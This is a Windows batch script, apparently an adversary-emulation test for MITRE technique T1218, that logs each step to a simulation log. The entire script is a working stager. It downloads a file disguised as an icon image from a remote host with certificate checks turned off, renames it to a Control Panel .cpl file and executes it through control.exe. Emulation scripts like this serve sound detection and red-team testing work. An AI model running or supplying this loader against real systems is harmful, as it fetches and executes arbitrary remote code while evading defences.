@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables)
SET xkqwo=%APPDATA%\11057\c164372f
SET mzjfa=1ff5533a.txt
SET hbxcn=https://10.0.0.49/stage/2/icon.png?11057-7
SET lprtv=BALAM-S2B
SET qstzx=11057
SET wvuyr=7
SET ztyab=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Short aliases for readability
SET logvar=!ztyab!
SET agentvar=!lprtv!
SET simidvar=!qstzx!
SET out_dir=!xkqwo!
SET out_file=!mzjfa!
SET heartbeat_url=!hbxcn!

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o "!out_dir!\!out_file!" "!heartbeat_url!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_fail>> "!logvar!" 2>nul
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=[FAIL]:curl_error>> "!logvar!" 2>nul
    exit /b 1
) ELSE (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_complete>> "!logvar!" 2>nul
)

REM Step 2: Change working directory to output directory
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_start>> "!logvar!" 2>nul
cd /d "!out_dir!" >nul 2>&1
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=!ERRORLEVEL!>> "!logvar!" 2>nul

REM Step 3: Strip extension and rename to .cpl
FOR %%i IN ("!out_file!") DO SET base_cpl=%%~ni
ren "!out_file!" "!base_cpl!.cpl"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: rename_fail>> "!logvar!" 2>nul
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=[FAIL]:rename_error>> "!logvar!" 2>nul
    exit /b 1
) ELSE (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: rename_complete>> "!logvar!" 2>nul
)

REM Step 4: Invoke Stage 2 Loader via control.exe with full absolute path
set cpl_path=!out_dir!\!base_cpl!.cpl
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: controlexec_start>> "!logvar!" 2>nul
control.exe "!cpl_path!"
set cpl_exit_code=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: controlexec_result=!cpl_exit_code!>> "!logvar!" 2>nul

REM Log final TTP result
IF !cpl_exit_code! EQU 0 (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=[OK]:>> "!logvar!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=[FAIL]:exitcode=!cpl_exit_code!>> "!logvar!" 2>nul
)

exit /b 0